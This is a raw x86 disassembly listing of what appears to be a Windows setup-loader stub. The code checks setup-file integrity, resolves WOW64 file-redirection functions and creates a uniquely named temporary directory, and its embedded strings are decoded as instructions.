  408dfd:	56                   	push   %esi
  408dfe:	b3 dc                	mov    $0xdc,%bl
  408e00:	be 5c c9 40 00       	mov    $0x40c95c,%esi
  408e05:	8b c6                	mov    %esi,%eax
  408e07:	e8 8c a3 ff ff       	call   0x403198
  408e0c:	83 c6 04             	add    $0x4,%esi
  408e0f:	fe cb                	dec    %bl
  408e11:	75 f2                	jne    0x408e05
  408e13:	5e                   	pop    %esi
  408e14:	5b                   	pop    %ebx
  408e15:	c3                   	ret
  408e16:	8b c0                	mov    %eax,%eax
  408e18:	b9 38 8e 40 00       	mov    $0x408e38,%ecx
  408e1d:	b2 01                	mov    $0x1,%dl
  408e1f:	b8 50 46 40 00       	mov    $0x404650,%eax
  408e24:	e8 57 ca ff ff       	call   0x405880
  408e29:	e8 86 a0 ff ff       	call   0x402eb4
  408e2e:	c3                   	ret
  408e2f:	00 ff                	add    %bh,%bh
  408e31:	ff                   	(bad)
  408e32:	ff                   	(bad)
  408e33:	ff 47 00             	incl   0x0(%edi)
  408e36:	00 00                	add    %al,(%eax)
  408e38:	54                   	push   %esp
  408e39:	68 65 20 73 65       	push   $0x65732065
  408e3e:	74 75                	je     0x408eb5
  408e40:	70 20                	jo     0x408e62
  408e42:	66 69 6c 65 73 20 61 	imul   $0x6120,0x73(%ebp,%eiz,2),%bp
  408e49:	72 65                	jb     0x408eb0
  408e4b:	20 63 6f             	and    %ah,0x6f(%ebx)
  408e4e:	72 72                	jb     0x408ec2
  408e50:	75 70                	jne    0x408ec2
  408e52:	74 65                	je     0x408eb9
  408e54:	64 2e 20 50 6c       	fs and %dl,%cs:0x6c(%eax)
  408e59:	65 61                	gs popa
  408e5b:	73 65                	jae    0x408ec2
  408e5d:	20 6f 62             	and    %ch,0x62(%edi)
  408e60:	74 61                	je     0x408ec3
  408e62:	69 6e 20 61 20 6e 65 	imul   $0x656e2061,0x20(%esi),%ebp
  408e69:	77 20                	ja     0x408e8b
  408e6b:	63 6f 70             	arpl   %ebp,0x70(%edi)
  408e6e:	79 20                	jns    0x408e90
  408e70:	6f                   	outsl  %ds:(%esi),(%dx)
  408e71:	66 20 74 68 65       	data16 and %dh,0x65(%eax,%ebp,2)
  408e76:	20 70 72             	and    %dh,0x72(%eax)
  408e79:	6f                   	outsl  %ds:(%esi),(%dx)
  408e7a:	67 72 61             	addr16 jb 0x408ede
  408e7d:	6d                   	insl   (%dx),%es:(%edi)
  408e7e:	2e 00 53 56          	add    %dl,%cs:0x56(%ebx)
  408e82:	57                   	push   %edi
  408e83:	55                   	push   %ebp
  408e84:	51                   	push   %ecx
  408e85:	8b fa                	mov    %edx,%edi
  408e87:	8b f0                	mov    %eax,%esi
  408e89:	83 ff 50             	cmp    $0x50,%edi
  408e8c:	7e 13                	jle    0x408ea1
  408e8e:	8b c6                	mov    %esi,%eax
  408e90:	ba c8 b1 40 00       	mov    $0x40b1c8,%edx
  408e95:	b9 40 00 00 00       	mov    $0x40,%ecx
  408e9a:	e8 6d 98 ff ff       	call   0x40270c
  408e9f:	74 05                	je     0x408ea6
  408ea1:	e8 72 ff ff ff       	call   0x408e18
  408ea6:	8b c6                	mov    %esi,%eax
  408ea8:	83 c0 40             	add    $0x40,%eax
  408eab:	89 c3                	mov    %eax,%ebx
  408ead:	8b 43 04             	mov    0x4(%ebx),%eax
  408eb0:	8b 53 08             	mov    0x8(%ebx),%edx
  408eb3:	f7 d2                	not    %edx
  408eb5:	3b c2                	cmp    %edx,%eax
  408eb7:	75 0c                	jne    0x408ec5
  408eb9:	3b f8                	cmp    %eax,%edi
  408ebb:	75 08                	jne    0x408ec5
  408ebd:	81 3b dc 00 00 00    	cmpl   $0xdc,(%ebx)
  408ec3:	74 05                	je     0x408eca
  408ec5:	e8 4e ff ff ff       	call   0x408e18
  408eca:	8b c3                	mov    %ebx,%eax
  408ecc:	83 c0 10             	add    $0x10,%eax
  408ecf:	89 c5                	mov    %eax,%ebp
  408ed1:	03 73 04             	add    0x4(%ebx),%esi
  408ed4:	89 34 24             	mov    %esi,(%esp)
  408ed7:	8b 04 24             	mov    (%esp),%eax
  408eda:	2b c5                	sub    %ebp,%eax
  408edc:	8b d0                	mov    %eax,%edx
  408ede:	8b c5                	mov    %ebp,%eax
  408ee0:	e8 33 ea ff ff       	call   0x407918
  408ee5:	3b 43 0c             	cmp    0xc(%ebx),%eax
  408ee8:	75 09                	jne    0x408ef3
  408eea:	8b 04 24             	mov    (%esp),%eax
  408eed:	80 78 ff 00          	cmpb   $0x0,-0x1(%eax)
  408ef1:	74 05                	je     0x408ef8
  408ef3:	e8 20 ff ff ff       	call   0x408e18
  408ef8:	b3 dc                	mov    $0xdc,%bl
  408efa:	be 5c c9 40 00       	mov    $0x40c95c,%esi
  408eff:	3b 2c 24             	cmp    (%esp),%ebp
  408f02:	72 05                	jb     0x408f09
  408f04:	e8 0f ff ff ff       	call   0x408e18
  408f09:	8b c5                	mov    %ebp,%eax
  408f0b:	e8 f4 bd ff ff       	call   0x404d04
  408f10:	8b f8                	mov    %eax,%edi
  408f12:	8b c6                	mov    %esi,%eax
  408f14:	8b cf                	mov    %edi,%ecx
  408f16:	8b d5                	mov    %ebp,%edx
  408f18:	e8 5b a3 ff ff       	call   0x403278
  408f1d:	47                   	inc    %edi
  408f1e:	03 ef                	add    %edi,%ebp
  408f20:	83 c6 04             	add    $0x4,%esi
  408f23:	fe cb                	dec    %bl
  408f25:	75 d8                	jne    0x408eff
  408f27:	5a                   	pop    %edx
  408f28:	5d                   	pop    %ebp
  408f29:	5f                   	pop    %edi
  408f2a:	5e                   	pop    %esi
  408f2b:	5b                   	pop    %ebx
  408f2c:	c3                   	ret
  408f2d:	8d 40 00             	lea    0x0(%eax),%eax
  408f30:	e8 c7 fe ff ff       	call   0x408dfc
  408f35:	c3                   	ret
  408f36:	8b c0                	mov    %eax,%eax
  408f38:	55                   	push   %ebp
  408f39:	8b ec                	mov    %esp,%ebp
  408f3b:	53                   	push   %ebx
  408f3c:	56                   	push   %esi
  408f3d:	57                   	push   %edi
  408f3e:	33 c0                	xor    %eax,%eax
  408f40:	55                   	push   %ebp
  408f41:	68 64 8f 40 00       	push   $0x408f64
  408f46:	64 ff 30             	push   %fs:(%eax)
  408f49:	64 89 20             	mov    %esp,%fs:(%eax)
  408f4c:	b8 08 b2 40 00       	mov    $0x40b208,%eax
  408f51:	e8 ae aa ff ff       	call   0x403a04
  408f56:	33 c0                	xor    %eax,%eax
  408f58:	5a                   	pop    %edx
  408f59:	59                   	pop    %ecx
  408f5a:	59                   	pop    %ecx
  408f5b:	64 89 10             	mov    %edx,%fs:(%eax)
  408f5e:	68 6b 8f 40 00       	push   $0x408f6b
  408f63:	c3                   	ret
  408f64:	e9 93 9e ff ff       	jmp    0x402dfc
  408f69:	eb f8                	jmp    0x408f63
  408f6b:	5f                   	pop    %edi
  408f6c:	5e                   	pop    %esi
  408f6d:	5b                   	pop    %ebx
  408f6e:	5d                   	pop    %ebp
  408f6f:	c3                   	ret
  408f70:	53                   	push   %ebx
  408f71:	8b da                	mov    %edx,%ebx
  408f73:	c6 03 00             	movb   $0x0,(%ebx)
  408f76:	84 c0                	test   %al,%al
  408f78:	75 04                	jne    0x408f7e
  408f7a:	b0 01                	mov    $0x1,%al
  408f7c:	5b                   	pop    %ebx
  408f7d:	c3                   	ret
  408f7e:	80 3d d4 cc 40 00 00 	cmpb   $0x0,0x40ccd4
  408f85:	74 19                	je     0x408fa0
  408f87:	8d 43 04             	lea    0x4(%ebx),%eax
  408f8a:	50                   	push   %eax
  408f8b:	ff 15 cc cc 40 00    	call   *0x40cccc
  408f91:	f7 d8                	neg    %eax
  408f93:	1b c0                	sbb    %eax,%eax
  408f95:	f7 d8                	neg    %eax
  408f97:	84 c0                	test   %al,%al
  408f99:	74 0e                	je     0x408fa9
  408f9b:	c6 03 01             	movb   $0x1,(%ebx)
  408f9e:	eb 09                	jmp    0x408fa9
  408fa0:	6a 01                	push   $0x1
  408fa2:	e8 35 b5 ff ff       	call   0x4044dc
  408fa7:	33 c0                	xor    %eax,%eax
  408fa9:	5b                   	pop    %ebx
  408faa:	c3                   	ret
  408fab:	90                   	nop
  408fac:	80 38 00             	cmpb   $0x0,(%eax)
  408faf:	74 0a                	je     0x408fbb
  408fb1:	8b 40 04             	mov    0x4(%eax),%eax
  408fb4:	50                   	push   %eax
  408fb5:	ff 15 d0 cc 40 00    	call   *0x40ccd0
  408fbb:	c3                   	ret
  408fbc:	55                   	push   %ebp
  408fbd:	8b ec                	mov    %esp,%ebp
  408fbf:	83 c4 f0             	add    $0xfffffff0,%esp
  408fc2:	53                   	push   %ebx
  408fc3:	56                   	push   %esi
  408fc4:	8b f2                	mov    %edx,%esi
  408fc6:	8b d8                	mov    %eax,%ebx
  408fc8:	8d 55 f4             	lea    -0xc(%ebp),%edx
  408fcb:	8b c3                	mov    %ebx,%eax
  408fcd:	e8 9e ff ff ff       	call   0x408f70
  408fd2:	84 c0                	test   %al,%al
  408fd4:	75 07                	jne    0x408fdd
  408fd6:	33 c0                	xor    %eax,%eax
  408fd8:	89 45 fc             	mov    %eax,-0x4(%ebp)
  408fdb:	eb 4c                	jmp    0x409029
  408fdd:	33 c0                	xor    %eax,%eax
  408fdf:	55                   	push   %ebp
  408fe0:	68 19 90 40 00       	push   $0x409019
  408fe5:	64 ff 30             	push   %fs:(%eax)
  408fe8:	64 89 20             	mov    %esp,%fs:(%eax)
  408feb:	8b c6                	mov    %esi,%eax
  408fed:	e8 22 a4 ff ff       	call   0x403414
  408ff2:	50                   	push   %eax
  408ff3:	e8 ec b3 ff ff       	call   0x4043e4
  408ff8:	89 45 fc             	mov    %eax,-0x4(%ebp)
  408ffb:	e8 44 b4 ff ff       	call   0x404444
  409000:	89 45 f0             	mov    %eax,-0x10(%ebp)
  409003:	33 c0                	xor    %eax,%eax
  409005:	5a                   	pop    %edx
  409006:	59                   	pop    %ecx
  409007:	59                   	pop    %ecx
  409008:	64 89 10             	mov    %edx,%fs:(%eax)
  40900b:	68 20 90 40 00       	push   $0x409020
  409010:	8d 45 f4             	lea    -0xc(%ebp),%eax
  409013:	e8 94 ff ff ff       	call   0x408fac
  409018:	c3                   	ret
  409019:	e9 de 9d ff ff       	jmp    0x402dfc
  40901e:	eb f0                	jmp    0x409010
  409020:	8b 45 f0             	mov    -0x10(%ebp),%eax
  409023:	50                   	push   %eax
  409024:	e8 b3 b4 ff ff       	call   0x4044dc
  409029:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40902c:	5e                   	pop    %esi
  40902d:	5b                   	pop    %ebx
  40902e:	8b e5                	mov    %ebp,%esp
  409030:	5d                   	pop    %ebp
  409031:	c3                   	ret
  409032:	8b c0                	mov    %eax,%eax
  409034:	55                   	push   %ebp
  409035:	8b ec                	mov    %esp,%ebp
  409037:	83 c4 f0             	add    $0xfffffff0,%esp
  40903a:	53                   	push   %ebx
  40903b:	56                   	push   %esi
  40903c:	8b f2                	mov    %edx,%esi
  40903e:	8b d8                	mov    %eax,%ebx
  409040:	8d 55 f4             	lea    -0xc(%ebp),%edx
  409043:	8b c3                	mov    %ebx,%eax
  409045:	e8 26 ff ff ff       	call   0x408f70
  40904a:	84 c0                	test   %al,%al
  40904c:	75 06                	jne    0x409054
  40904e:	c6 45 ff 00          	movb   $0x0,-0x1(%ebp)
  409052:	eb 46                	jmp    0x40909a
  409054:	33 c0                	xor    %eax,%eax
  409056:	55                   	push   %ebp
  409057:	68 8a 90 40 00       	push   $0x40908a
  40905c:	64 ff 30             	push   %fs:(%eax)
  40905f:	64 89 20             	mov    %esp,%fs:(%eax)
  409062:	8b c6                	mov    %esi,%eax
  409064:	e8 df d9 ff ff       	call   0x406a48
  409069:	88 45 ff             	mov    %al,-0x1(%ebp)
  40906c:	e8 d3 b3 ff ff       	call   0x404444
  409071:	89 45 f0             	mov    %eax,-0x10(%ebp)
  409074:	33 c0                	xor    %eax,%eax
  409076:	5a                   	pop    %edx
  409077:	59                   	pop    %ecx
  409078:	59                   	pop    %ecx
  409079:	64 89 10             	mov    %edx,%fs:(%eax)
  40907c:	68 91 90 40 00       	push   $0x409091
  409081:	8d 45 f4             	lea    -0xc(%ebp),%eax
  409084:	e8 23 ff ff ff       	call   0x408fac
  409089:	c3                   	ret
  40908a:	e9 6d 9d ff ff       	jmp    0x402dfc
  40908f:	eb f0                	jmp    0x409081
  409091:	8b 45 f0             	mov    -0x10(%ebp),%eax
  409094:	50                   	push   %eax
  409095:	e8 42 b4 ff ff       	call   0x4044dc
  40909a:	8a 45 ff             	mov    -0x1(%ebp),%al
  40909d:	5e                   	pop    %esi
  40909e:	5b                   	pop    %ebx
  40909f:	8b e5                	mov    %ebp,%esp
  4090a1:	5d                   	pop    %ebp
  4090a2:	c3                   	ret
  4090a3:	90                   	nop
  4090a4:	55                   	push   %ebp
  4090a5:	8b ec                	mov    %esp,%ebp
  4090a7:	6a 00                	push   $0x0
  4090a9:	53                   	push   %ebx
  4090aa:	56                   	push   %esi
  4090ab:	57                   	push   %edi
  4090ac:	33 c0                	xor    %eax,%eax
  4090ae:	55                   	push   %ebp
  4090af:	68 3d 91 40 00       	push   $0x40913d
  4090b4:	64 ff 30             	push   %fs:(%eax)
  4090b7:	64 89 20             	mov    %esp,%fs:(%eax)
  4090ba:	68 4c 91 40 00       	push   $0x40914c
  4090bf:	68 6c 91 40 00       	push   $0x40916c
  4090c4:	e8 93 b3 ff ff       	call   0x40445c
  4090c9:	50                   	push   %eax
  4090ca:	e8 95 b3 ff ff       	call   0x404464
  4090cf:	a3 cc cc 40 00       	mov    %eax,0x40cccc
  4090d4:	68 7c 91 40 00       	push   $0x40917c
  4090d9:	68 6c 91 40 00       	push   $0x40916c
  4090de:	e8 79 b3 ff ff       	call   0x40445c
  4090e3:	50                   	push   %eax
  4090e4:	e8 7b b3 ff ff       	call   0x404464
  4090e9:	a3 d0 cc 40 00       	mov    %eax,0x40ccd0
  4090ee:	83 3d cc cc 40 00 00 	cmpl   $0x0,0x40cccc
  4090f5:	74 09                	je     0x409100
  4090f7:	83 3d d0 cc 40 00 00 	cmpl   $0x0,0x40ccd0
  4090fe:	75 04                	jne    0x409104
  409100:	33 c0                	xor    %eax,%eax
  409102:	eb 02                	jmp    0x409106
  409104:	b0 01                	mov    $0x1,%al
  409106:	a2 d4 cc 40 00       	mov    %al,0x40ccd4
  40910b:	ba 00 80 00 00       	mov    $0x8000,%edx
  409110:	b8 a4 91 40 00       	mov    $0x4091a4,%eax
  409115:	e8 86 de ff ff       	call   0x406fa0
  40911a:	8d 55 fc             	lea    -0x4(%ebp),%edx
  40911d:	b8 fb 3a 78 4c       	mov    $0x4c783afb,%eax
  409122:	e8 5d e1 ff ff       	call   0x407284
  409127:	33 c0                	xor    %eax,%eax
  409129:	5a                   	pop    %edx
  40912a:	59                   	pop    %ecx
  40912b:	59                   	pop    %ecx
  40912c:	64 89 10             	mov    %edx,%fs:(%eax)
  40912f:	68 44 91 40 00       	push   $0x409144
  409134:	8d 45 fc             	lea    -0x4(%ebp),%eax
  409137:	e8 5c a0 ff ff       	call   0x403198
  40913c:	c3                   	ret
  40913d:	e9 ba 9c ff ff       	jmp    0x402dfc
  409142:	eb f0                	jmp    0x409134
  409144:	5f                   	pop    %edi
  409145:	5e                   	pop    %esi
  409146:	5b                   	pop    %ebx
  409147:	59                   	pop    %ecx
  409148:	5d                   	pop    %ebp
  409149:	c3                   	ret
  40914a:	00 00                	add    %al,(%eax)
  40914c:	57                   	push   %edi
  40914d:	6f                   	outsl  %ds:(%esi),(%dx)
  40914e:	77 36                	ja     0x409186
  409150:	34 44                	xor    $0x44,%al
  409152:	69 73 61 62 6c 65 57 	imul   $0x57656c62,0x61(%ebx),%esi
  409159:	6f                   	outsl  %ds:(%esi),(%dx)
  40915a:	77 36                	ja     0x409192
  40915c:	34 46                	xor    $0x46,%al
  40915e:	73 52                	jae    0x4091b2
  409160:	65 64 69 72 65 63 74 	gs imul $0x6f697463,%fs:0x65(%edx),%esi
  409167:	69 6f 
  409169:	6e                   	outsb  %ds:(%esi),(%dx)
  40916a:	00 00                	add    %al,(%eax)
  40916c:	6b 65 72 6e          	imul   $0x6e,0x72(%ebp),%esp
  409170:	65 6c                	gs insb (%dx),%es:(%edi)
  409172:	33 32                	xor    (%edx),%esi
  409174:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  409177:	6c                   	insb   (%dx),%es:(%edi)
  409178:	00 00                	add    %al,(%eax)
  40917a:	00 00                	add    %al,(%eax)
  40917c:	57                   	push   %edi
  40917d:	6f                   	outsl  %ds:(%esi),(%dx)
  40917e:	77 36                	ja     0x4091b6
  409180:	34 52                	xor    $0x52,%al
  409182:	65 76 65             	gs jbe 0x4091ea
  409185:	72 74                	jb     0x4091fb
  409187:	57                   	push   %edi
  409188:	6f                   	outsl  %ds:(%esi),(%dx)
  409189:	77 36                	ja     0x4091c1
  40918b:	34 46                	xor    $0x46,%al
  40918d:	73 52                	jae    0x4091e1
  40918f:	65 64 69 72 65 63 74 	gs imul $0x6f697463,%fs:0x65(%edx),%esi
  409196:	69 6f 
  409198:	6e                   	outsb  %ds:(%esi),(%dx)
  409199:	00 00                	add    %al,(%eax)
  40919b:	00 ff                	add    %bh,%bh
  40919d:	ff                   	(bad)
  40919e:	ff                   	(bad)
  40919f:	ff 0b                	decl   (%ebx)
  4091a1:	00 00                	add    %al,(%eax)
  4091a3:	00 73 68             	add    %dh,0x68(%ebx)
  4091a6:	65 6c                	gs insb (%dx),%es:(%edi)
  4091a8:	6c                   	insb   (%dx),%es:(%edi)
  4091a9:	33 32                	xor    (%edx),%esi
  4091ab:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  4091ae:	6c                   	insb   (%dx),%es:(%edi)
  4091af:	00 55 8b             	add    %dl,-0x75(%ebp)
  4091b2:	ec                   	in     (%dx),%al
  4091b3:	6a 00                	push   $0x0
  4091b5:	53                   	push   %ebx
  4091b6:	56                   	push   %esi
  4091b7:	57                   	push   %edi
  4091b8:	8b fa                	mov    %edx,%edi
  4091ba:	8b f0                	mov    %eax,%esi
  4091bc:	33 c0                	xor    %eax,%eax
  4091be:	55                   	push   %ebp
  4091bf:	68 14 92 40 00       	push   $0x409214
  4091c4:	64 ff 30             	push   %fs:(%eax)
  4091c7:	64 89 20             	mov    %esp,%fs:(%eax)
  4091ca:	8b c7                	mov    %edi,%eax
  4091cc:	e8 c7 9f ff ff       	call   0x403198
  4091d1:	bb 05 00 00 00       	mov    $0x5,%ebx
  4091d6:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4091d9:	8b d6                	mov    %esi,%edx
  4091db:	83 e2 1f             	and    $0x1f,%edx
  4091de:	8a 92 14 b2 40 00    	mov    0x40b214(%edx),%dl
  4091e4:	e8 bf a0 ff ff       	call   0x4032a8
  4091e9:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4091ec:	8b d7                	mov    %edi,%edx
  4091ee:	b9 01 00 00 00       	mov    $0x1,%ecx
  4091f3:	e8 9c a2 ff ff       	call   0x403494
  4091f8:	c1 ee 05             	shr    $0x5,%esi
  4091fb:	4b                   	dec    %ebx
  4091fc:	75 d8                	jne    0x4091d6
  4091fe:	33 c0                	xor    %eax,%eax
  409200:	5a                   	pop    %edx
  409201:	59                   	pop    %ecx
  409202:	59                   	pop    %ecx
  409203:	64 89 10             	mov    %edx,%fs:(%eax)
  409206:	68 1b 92 40 00       	push   $0x40921b
  40920b:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40920e:	e8 85 9f ff ff       	call   0x403198
  409213:	c3                   	ret
  409214:	e9 e3 9b ff ff       	jmp    0x402dfc
  409219:	eb f0                	jmp    0x40920b
  40921b:	5f                   	pop    %edi
  40921c:	5e                   	pop    %esi
  40921d:	5b                   	pop    %ebx
  40921e:	59                   	pop    %ecx
  40921f:	5d                   	pop    %ebp
  409220:	c3                   	ret
  409221:	8d 40 00             	lea    0x0(%eax),%eax
  409224:	55                   	push   %ebp
  409225:	8b ec                	mov    %esp,%ebp
  409227:	6a 00                	push   $0x0
  409229:	6a 00                	push   $0x0
  40922b:	6a 00                	push   $0x0
  40922d:	6a 00                	push   $0x0
  40922f:	6a 00                	push   $0x0
  409231:	53                   	push   %ebx
  409232:	56                   	push   %esi
  409233:	57                   	push   %edi
  409234:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  409237:	89 55 fc             	mov    %edx,-0x4(%ebp)
  40923a:	8b d8                	mov    %eax,%ebx
  40923c:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40923f:	e8 c0 a1 ff ff       	call   0x403404
  409244:	33 c0                	xor    %eax,%eax
  409246:	55                   	push   %ebp
  409247:	68 12 93 40 00       	push   $0x409312
  40924c:	64 ff 30             	push   %fs:(%eax)
  40924f:	64 89 20             	mov    %esp,%fs:(%eax)
  409252:	8d 55 f0             	lea    -0x10(%ebp),%edx
  409255:	8b 45 fc             	mov    -0x4(%ebp),%eax
  409258:	e8 db d3 ff ff       	call   0x406638
  40925d:	8b 55 f0             	mov    -0x10(%ebp),%edx
  409260:	8d 45 fc             	lea    -0x4(%ebp),%eax
  409263:	e8 c4 9f ff ff       	call   0x40322c
  409268:	b8 00 00 00 02       	mov    $0x2000000,%eax
  40926d:	e8 2a 95 ff ff       	call   0x40279c
  409272:	8b f0                	mov    %eax,%esi
  409274:	8b fe                	mov    %esi,%edi
  409276:	47                   	inc    %edi
  409277:	81 ff ff ff ff 01    	cmp    $0x1ffffff,%edi
  40927d:	7e 02                	jle    0x409281
  40927f:	33 ff                	xor    %edi,%edi
  409281:	3b f7                	cmp    %edi,%esi
  409283:	75 2c                	jne    0x4092b1
  409285:	8d 55 ec             	lea    -0x14(%ebp),%edx
  409288:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40928b:	e8 e8 d6 ff ff       	call   0x406978
  409290:	8b 55 ec             	mov    -0x14(%ebp),%edx
  409293:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  409296:	b0 4b                	mov    $0x4b,%al
  409298:	e8 3b fb ff ff       	call   0x408dd8
  40929d:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4092a0:	b2 01                	mov    $0x1,%dl
  4092a2:	b8 50 46 40 00       	mov    $0x404650,%eax
  4092a7:	e8 d4 c5 ff ff       	call   0x405880
  4092ac:	e8 03 9c ff ff       	call   0x402eb4
  4092b1:	ff 75 fc             	push   -0x4(%ebp)
  4092b4:	68 2c 93 40 00       	push   $0x40932c
  4092b9:	8d 55 f0             	lea    -0x10(%ebp),%edx
  4092bc:	8b c7                	mov    %edi,%eax
  4092be:	e8 ed fe ff ff       	call   0x4091b0
  4092c3:	ff 75 f0             	push   -0x10(%ebp)
  4092c6:	ff 75 f8             	push   -0x8(%ebp)
  4092c9:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4092cc:	ba 04 00 00 00       	mov    $0x4,%edx
  4092d1:	e8 de a0 ff ff       	call   0x4033b4
  4092d6:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4092d9:	8b c3                	mov    %ebx,%eax
  4092db:	e8 54 fd ff ff       	call   0x409034
  4092e0:	84 c0                	test   %al,%al
  4092e2:	75 92                	jne    0x409276
  4092e4:	8b 45 08             	mov    0x8(%ebp),%eax
  4092e7:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4092ea:	e8 3d 9f ff ff       	call   0x40322c
  4092ef:	33 c0                	xor    %eax,%eax
  4092f1:	5a                   	pop    %edx
  4092f2:	59                   	pop    %ecx
  4092f3:	59                   	pop    %ecx
  4092f4:	64 89 10             	mov    %edx,%fs:(%eax)
  4092f7:	68 19 93 40 00       	push   $0x409319
  4092fc:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4092ff:	ba 03 00 00 00       	mov    $0x3,%edx
  409304:	e8 af 9e ff ff       	call   0x4031b8
  409309:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40930c:	e8 87 9e ff ff       	call   0x403198
  409311:	c3                   	ret
  409312:	e9 e5 9a ff ff       	jmp    0x402dfc
  409317:	eb e3                	jmp    0x4092fc
  409319:	5f                   	pop    %edi
  40931a:	5e                   	pop    %esi
  40931b:	5b                   	pop    %ebx
  40931c:	8b e5                	mov    %ebp,%esp
  40931e:	5d                   	pop    %ebp
  40931f:	c2 04 00             	ret    $0x4
  409322:	00 00                	add    %al,(%eax)
  409324:	ff                   	(bad)
  409325:	ff                   	(bad)
  409326:	ff                   	(bad)
  409327:	ff 03                	incl   (%ebx)
  409329:	00 00                	add    %al,(%eax)
  40932b:	00 69 73             	add    %ch,0x73(%ecx)
  40932e:	2d 00 55 8b ec       	sub    $0xec8b5500,%eax
  409333:	33 c9                	xor    %ecx,%ecx
  409335:	51                   	push   %ecx
  409336:	51                   	push   %ecx
  409337:	51                   	push   %ecx
  409338:	51                   	push   %ecx
  409339:	51                   	push   %ecx
  40933a:	51                   	push   %ecx
  40933b:	51                   	push   %ecx
  40933c:	51                   	push   %ecx
  40933d:	53                   	push   %ebx
  40933e:	56                   	push   %esi
  40933f:	57                   	push   %edi
  409340:	8b f0                	mov    %eax,%esi
  409342:	33 c0                	xor    %eax,%eax
  409344:	55                   	push   %ebp
  409345:	68 1f 94 40 00       	push   $0x40941f
  40934a:	64 ff 30             	push   %fs:(%eax)
  40934d:	64 89 20             	mov    %esp,%fs:(%eax)
  409350:	8d 45 fc             	lea    -0x4(%ebp),%eax
  409353:	50                   	push   %eax
  409354:	8d 45 f8             	lea    -0x8(%ebp),%eax
  409357:	e8 98 d9 ff ff       	call   0x406cf4
  40935c:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40935f:	b9 38 94 40 00       	mov    $0x409438,%ecx
  409364:	33 c0                	xor    %eax,%eax
  409366:	e8 b9 fe ff ff       	call   0x409224
  40936b:	6a 00                	push   $0x0
  40936d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  409370:	e8 9f a0 ff ff       	call   0x403414
  409375:	50                   	push   %eax
  409376:	e8 51 b0 ff ff       	call   0x4043cc
  40937b:	85 c0                	test   %eax,%eax
  40937d:	75 6e                	jne    0x4093ed
  40937f:	e8 c0 b0 ff ff       	call   0x404444
  409384:	8b d8                	mov    %eax,%ebx
  409386:	81 fb b7 00 00 00    	cmp    $0xb7,%ebx
  40938c:	74 c2                	je     0x409350
  40938e:	8d 45 f8             	lea    -0x8(%ebp),%eax
  409391:	50                   	push   %eax
  409392:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  409395:	8b 55 fc             	mov    -0x4(%ebp),%edx
  409398:	b0 35                	mov    $0x35,%al
  40939a:	e8 39 fa ff ff       	call   0x408dd8
  40939f:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4093a2:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4093a5:	8d 55 e4             	lea    -0x1c(%ebp),%edx
  4093a8:	8b c3                	mov    %ebx,%eax
  4093aa:	e8 d5 b8 ff ff       	call   0x404c84
  4093af:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4093b2:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4093b5:	8d 55 e0             	lea    -0x20(%ebp),%edx
  4093b8:	8b c3                	mov    %ebx,%eax
  4093ba:	e8 c5 de ff ff       	call   0x407284
  4093bf:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4093c2:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4093c5:	8d 55 ec             	lea    -0x14(%ebp),%edx
  4093c8:	b9 02 00 00 00       	mov    $0x2,%ecx
  4093cd:	b0 67                	mov    $0x67,%al
  4093cf:	e8 d4 f9 ff ff       	call   0x408da8
  4093d4:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4093d7:	b2 01                	mov    $0x1,%dl
  4093d9:	b8 50 46 40 00       	mov    $0x404650,%eax
  4093de:	e8 9d c4 ff ff       	call   0x405880
  4093e3:	e8 cc 9a ff ff       	call   0x402eb4
  4093e8:	e9 63 ff ff ff       	jmp    0x409350
  4093ed:	8b c6                	mov    %esi,%eax
  4093ef:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4093f2:	e8 35 9e ff ff       	call   0x40322c
  4093f7:	33 c0                	xor    %eax,%eax
  4093f9:	5a                   	pop    %edx
  4093fa:	59                   	pop    %ecx
  4093fb:	59                   	pop    %ecx
  4093fc:	64 89 10             	mov    %edx,%fs:(%eax)
  4093ff:	68 26 94 40 00       	push   $0x409426
  409404:	8d 45 e0             	lea    -0x20(%ebp),%eax
  409407:	ba 03 00 00 00       	mov    $0x3,%edx
  40940c:	e8 a7 9d ff ff       	call   0x4031b8
  409411:	8d 45 f8             	lea    -0x8(%ebp),%eax
  409414:	ba 02 00 00 00       	mov    $0x2,%edx
  409419:	e8 9a 9d ff ff       	call   0x4031b8
  40941e:	c3                   	ret
  40941f:	e9 d8 99 ff ff       	jmp    0x402dfc
  409424:	eb de                	jmp    0x409404
  409426:	5f                   	pop    %edi
  409427:	5e                   	pop    %esi
  409428:	5b                   	pop    %ebx
  409429:	8b e5                	mov    %ebp,%esp
  40942b:	5d                   	pop    %ebp
  40942c:	c3                   	ret
  40942d:	00 00                	add    %al,(%eax)
  40942f:	00 ff                	add    %bh,%bh
  409431:	ff                   	(bad)
  409432:	ff                   	(bad)
  409433:	ff 04 00             	incl   (%eax,%eax,1)
  409436:	00 00                	add    %al,(%eax)
  409438:	2e 74 6d             	je,pn  0x4094a8
  40943b:	70 00                	jo     0x40943d
  40943d:	00 00                	add    %al,(%eax)
  40943f:	00 ff                	add    %bh,%bh
  409441:	25 4c d2 40 00       	and    $0x40d24c,%eax
  409446:	8b c0                	mov    %eax,%eax
  409448:	83 c4 ec             	add    $0xffffffec,%esp
  40944b:	83 3d 7c b0 40 00 02 	cmpl   $0x2,0x40b07c
